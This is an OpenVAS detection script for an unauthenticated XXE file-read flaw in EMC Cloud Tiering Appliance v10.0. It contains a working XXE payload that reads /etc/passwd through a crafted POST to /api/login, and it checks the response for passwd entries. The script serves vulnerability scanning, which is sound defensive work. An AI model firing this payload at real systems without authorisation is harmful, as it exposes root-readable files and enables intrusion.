###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_emc_cloud_tiering_xxe_04_14.nasl 8654 2018-02-05 08:19:22Z cfischer $
#
# EMC Cloud Tiering Appliance v10.0 Unauthenticated XXE Arbitrary File Read
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2014 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103931";

tag_insight = " EMC CTA v10.0 is susceptible to an unauthenticated XXE attack
that allows an attacker to read arbitrary files from the file system
with the permissions of the root user.";

tag_impact = "An attacker can read arbitrary files from the file system
with the permissions of the root user";

tag_affected = "EMC CTA v10.0";

tag_summary = "EMC Cloud Tiering Appliance v10.0 is susceptible to an unauthenticated
XXE attack";

tag_solution = "Ask the vendor for an update";
tag_vuldetect = "Send a special crafted HTTP POST request and check the response.";

if (description)
{
 script_oid(SCRIPT_OID);
 script_version ("$Revision: 8654 $");
 script_tag(name:"cvss_base", value:"8.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:P/A:N");

 script_name("EMC Cloud Tiering Appliance v10.0 Unauthenticated XXE Arbitrary File Read");


 script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/32623/");
 
 script_tag(name:"last_modification", value:"$Date: 2018-02-05 09:19:22 +0100 (Mon, 05 Feb 2018) $");
 script_tag(name:"creation_date", value:"2014-04-01 11:51:50 +0200 (Tue, 01 Apr 2014)");
 script_category(ACT_ATTACK);
 script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2014 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80, 443);
 script_exclude_keys("Settings/disable_cgi_scanning");

 script_tag(name : "impact" , value : tag_impact);
 script_tag(name : "vuldetect" , value : tag_vuldetect);
 script_tag(name : "insight" , value : tag_insight);
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 script_tag(name : "affected" , value : tag_affected);

 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

port = get_http_port( default:443 );

buf = http_get_cache( item:"/", port:port );

if( "EMC Cloud Tiering" >!< buf ) exit( 0 );

host = http_host_name(port:port);

xxe = '<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<Request>
<Username>root</Username>
<Password>&xxe;</Password>
</Request>';

len = strlen( xxe );

req = 'POST /api/login HTTP/1.1\r\n' +
      'Host: ' + host + '\r\n' + 
      'User-Agent: ' + OPENVAS_HTTP_USER_AGENT +'\r\n' +
      'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n' +
      'Accept-Language: en-US,en;q=0.5\r\n' +
      'Accept-Encoding: identity\r\n' +
      'Cookie: JSESSIONID=12818F1AC5C744CF444B2683ABF6E8AC\r\n' +
      'Connection: keep-alive\r\n' +
      'Referer: https://' + host + '/UxFramework/UxFlashApplication.swf\r\n' +
      'Content-Type: application/x-www-form-urlencoded\r\n' +
      'Content-Length: ' + len + '\r\n' +
      '\r\n' +
      xxe;

buf = http_send_recv( port:port, data:req, bodyonly:FALSE );

if( buf =~ 'root:.*:0:[01]:' )
{
  security_message( port:port );
  exit( 0 );
}

exit( 0 );

